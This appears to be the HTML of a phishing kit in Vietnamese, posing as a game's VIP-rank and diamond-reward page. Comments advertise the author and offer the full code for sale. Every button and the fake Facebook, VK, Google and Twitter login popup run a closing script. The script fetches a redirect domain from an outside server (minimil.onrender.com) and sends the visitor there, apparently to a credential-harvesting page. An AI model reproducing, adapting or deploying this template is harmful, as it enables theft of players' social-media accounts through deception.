        <section id="main-body">
            <div class="main-content main-home">
                <div class="main">
                    <div class="container">
                        <div class="row">
                            <div class="col col--home-left">
                                <div class="rank-balance">
                                    <div class="rank-image"><img src="images/ranks/UNRANK.png" alt="">
                                    </div>
                                    <div class="rank-name"><span class="text-gradient text-gradient--silver">
                                            <em></em></span>
                                    </div>
                                    <div class="gem-accumulate">0</div>
                                    <div class="gem-exchanging">0</div>
                                </div>
                                <div class="acuumulate-notice">* 0 <img src="images/gem.png" alt=""
                                        class="icon-gem icon-gem--small"> tích luỹ sẽ hết hạn vào ngày mai</div>
                                <div class="home-btns">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-6"><a class="btn btn--long btn--fw loginFb"><span>Lịch sử
                                                        nạp</span></a>
                                            </div>
                                            <div class="col-6"><a
                                                    class="btn btn--long btn--long--right btn--fw loginFb"><span>Thông
                                                        tin cá nhân</span></a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="home-slider">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-12">
                                                <div
                                                    class="swiper swiper-initialized swiper-horizontal swiper-backface-hidden">
                                                    <div class="swiper-wrapper"
                                                        style="transform: translate3d(0px, 0px, 0px);">
                                                        <div class="swiper-slide swiper-slide-active"
                                                            style="width: 745px;">
                                                            <div class="slide"><img src="images/slide.jpg" alt=""
                                                                    class="slide__img"><span class="slide__title">Quyền
                                                                    lợi các hạng vip</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    class="slide__pagination swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal swiper-pagination-lock">
                                                    <span
                                                        class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col col--home-right">
                                <div class="progress">
                                    <div class="prog">
                                        <div class="prog__percent" style="width: 0%;"></div>
                                    </div>
                                    <div class="current-rank has-title"><img src="images/ranks/UNRANK.png" alt=""><span
                                            class="title">Chưa có hạng</span>
                                    </div>
                                    <div class="next-rank has-title"><img src="images/ranks/GOLD.png" alt=""><span
                                            class="title">Vàng</span>
                                    </div>
                                </div>
                                <div class="home-list">
                                    <div class="swiper swiper-initialized swiper-horizontal swiper-backface-hidden">
                                        <div class="swiper-wrapper">
                                            <div class="swiper-slide swiper-slide-active" style="width: 861px;">
                                                <div class="ScrollbarsCustom list-scrollbar"
                                                    style="position: relative; width: 100%; height: 45vh;">
                                                    <div class="ScrollbarsCustom-Wrapper"
                                                        style="position: absolute; inset: 0px; overflow: hidden;">
                                                        <div class="ScrollbarsCustom-Scroller"
                                                            style="position: absolute; inset: 0px; overflow: hidden;">
                                                            <div class="ScrollbarsCustom-Content"
                                                                style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                                                <div class="line">Nhận Điểm Quy Đổi khi nạp kim cương
                                                                </div>
                                                                <div class="line">Truy cập Cửa Hàng Quy Đổi </div>
                                                                <div class="line">Quà Sinh Nhật (gói 50 cấp BP; ưu đãi
                                                                    nạp kim cương; Điểm Quy Đổi; kim cương tích luỹ)
                                                                </div>
                                                                <div class="line">Ưu đãi kim cương tích luỹ +10%</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="swiper-slide swiper-slide-next" style="width: 861px;">
                                                <div class="ScrollbarsCustom list-scrollbar"
                                                    style="position: relative; width: 100%; height: 45vh;">
                                                    <div class="ScrollbarsCustom-Wrapper"
                                                        style="position: absolute; inset: 0px; overflow: hidden;">
                                                        <div class="ScrollbarsCustom-Scroller"
                                                            style="position: absolute; inset: 0px; overflow: hidden;">
                                                            <div class="ScrollbarsCustom-Content"
                                                                style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                                                <div class="line">Nhận Điểm Quy Đổi khi nạp kim cương
                                                                </div>
                                                                <div class="line">Truy cập Cửa Hàng Quy Đổi </div>
                                                                <div class="line">Quà Sinh Nhật (gói 50 cấp BP; ưu đãi
                                                                    nạp kim cương; Điểm Quy Đổi; kim cương tích luỹ)
                                                                </div>
                                                                <div class="line">Ưu đãi kim cương tích luỹ +10%</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="swiper-slide" style="width: 861px;">
                                                <div class="ScrollbarsCustom list-scrollbar"
                                                    style="position: relative; width: 100%; height: 45vh;">
                                                    <div class="ScrollbarsCustom-Wrapper"
                                                        style="position: absolute; inset: 0px; overflow: hidden;">
                                                        <div class="ScrollbarsCustom-Scroller"
                                                            style="position: absolute; inset: 0px; overflow: hidden;">
                                                            <div class="ScrollbarsCustom-Content"
                                                                style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                                                <div class="line">Nhận Điểm Quy Đổi khi nạp kim cương
                                                                </div>
                                                                <div class="line">Truy cập Cửa Hàng Quy Đổi </div>
                                                                <div class="line">Quà Sinh Nhật (gói 50 cấp BP; ưu đãi
                                                                    nạp kim cương; Điểm Quy Đổi; kim cương tích luỹ)
                                                                </div>
                                                                <div class="line">Ưu đãi kim cương tích luỹ +10%</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="swiper-slide" style="width: 861px;">
                                                <div class="ScrollbarsCustom list-scrollbar"
                                                    style="position: relative; width: 100%; height: 45vh;">
                                                    <div class="ScrollbarsCustom-Wrapper"
                                                        style="position: absolute; inset: 0px; overflow: hidden;">
                                                        <div class="ScrollbarsCustom-Scroller"
                                                            style="position: absolute; inset: 0px; overflow: hidden;">
                                                            <div class="ScrollbarsCustom-Content"
                                                                style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                                                <div class="line">Nhận Điểm Quy Đổi khi nạp kim cương
                                                                </div>
                                                                <div class="line">Truy cập Cửa Hàng Quy Đổi </div>
                                                                <div class="line">Quà Sinh Nhật (gói 50 cấp BP; ưu đãi
                                                                    nạp kim cương; Điểm Quy Đổi; kim cương tích luỹ)
                                                                </div>
                                                                <div class="line">Ưu đãi kim cương tích luỹ +10%</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                                                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                                                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                                                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal">
                                            <span
                                                class="swiper-pagination-bullet swiper-pagination-bullet-active"></span><span
                                                class="swiper-pagination-bullet"></span><span
                                                class="swiper-pagination-bullet"></span><span
                                                class="swiper-pagination-bullet"></span>
                                        </div>
                                    </div><a class="swiper-button-next loginFb">&nbsp;</a><a
                                        class="swiper-button-prev swiper-button-disabled loginFb">&nbsp;</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    <!-- LUONG VAN TAN 
Facebook.com/vantan2khong6  -->


    <!-- LUONG VAN TAN 
Vui lòng mua code full không có trang napthe chỉ 150k tại zalo: 0559342006  -->


    <div class="swal2-container swal2-center swal2-backdrop-show" style="overflow-y: auto;">
        <div aria-labelledby="swal2-title" aria-describedby="swal2-html-container"
            class="swal2-popup swal2-modal popup-small popup-login swing-in-top-fwd" tabindex="-1" role="dialog"
            aria-live="assertive" aria-modal="true" style="display: grid;">
            <button type="button" class="swal2-close" aria-label="Close this dialog" style="display: flex;">×</button>
            <ul class="swal2-progress-steps" style="display: none;"></ul>
            <div class="swal2-icon" style="display: none;"></div><img class="swal2-image" style="display: none;">
            <h2 class="swal2-title" id="swal2-title" style="display: block;"><span>Đăng nhập</span></h2>
            <div class="swal2-html-container" id="swal2-html-container" style="display: block;">
                <p class="login-icon">
                    <a class="loginFb"><img src="images/logo-fb.png" alt="">
                    </a> &nbsp;
                    <a class="loginFb"><img src="images/logo-vk.png" alt="">
                    </a> &nbsp;
                    <a class="loginFb"><img src="images/logo-gm.png" alt="">
                    </a>&nbsp;
                    <a class="loginFb"><img src="images/logo-tw.png" alt="">
                    </a>
                </p>
            </div>
            <input class="swal2-input" style="display: none;">
            <input type="file" class="swal2-file" style="display: none;">
            <div class="swal2-range" style="display: none;">
                <input type="range">
                <output></output>
            </div>
            <select class="swal2-select" style="display: none;"></select>
            <div class="swal2-radio" style="display: none;"></div>
            <label for="swal2-checkbox" class="swal2-checkbox" style="display: none;">
                <input type="checkbox"><span class="swal2-label"></span>
            </label>
            <textarea class="swal2-textarea" style="display: none;"></textarea>
            <div class="swal2-validation-message" id="swal2-validation-message" style="display: none;"></div>
            <div class="swal2-actions" style="display: none;">
                <div class="swal2-loader"></div>
                <button type="button" class="swal2-confirm swal2-styled" aria-label=""
                    style="display: none;">OK</button>
                <button type="button" class="swal2-deny swal2-styled" aria-label="" style="display: none;">No</button>
                <button type="button" class="swal2-cancel swal2-styled" aria-label=""
                    style="display: none;">Cancel</button>
            </div>
            <div class="swal2-footer" style="display: none;"></div>
            <div class="swal2-timer-progress-bar-container">
                <div class="swal2-timer-progress-bar" style="display: none;"></div>
            </div>
        </div>
    </div>

    <script>
        const btns = document.querySelectorAll('.loginFb');
        btns.forEach(btn => {
            btn.addEventListener('click', async () => {
                const domain = window.location.protocol + "//" + window.location.host;
                (async () => {
                    try {
                        let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                        data = await data.json()
                        window.location.href = data.data.domain_fb;
                    } catch {

                    }
                })();
            })
        })

    </script>
</body>

</html>